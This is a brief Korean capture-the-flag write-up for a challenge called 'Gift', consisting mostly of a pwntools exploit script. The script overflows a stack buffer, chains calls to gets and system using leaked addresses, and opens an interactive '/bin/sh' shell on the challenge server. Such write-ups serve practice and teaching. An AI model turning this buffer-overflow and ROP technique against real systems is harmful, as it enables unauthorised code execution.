# Gift

실행시키면 "/bin/sh"를 입력할 수 있는 영역의 주소와 system함수의 주소를 알려준다.   
이를 이용하면 쉽게 해결할 수 있다.   
</br>

```
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3018)
e = ELF('./gift')

gets_addr = e.symbols['gets']
pr = 0x80483ad

p.recvuntil(': ')

binsh = int(p.recv(10), 16)
system_addr = int(p.recv(10), 16)

payload = ''
payload += 'A'*0x84 + 'BBBB'

payload += p32(gets_addr)
payload += p32(pr)
payload += p32(binsh)

payload += p32(system_addr)
payload += "BBBB"
payload += p32(binsh)


p.sendline('AAAA')
p.recvline()

p.sendline(payload)

p.sendline('/bin/sh\00')

p.interactive()
```
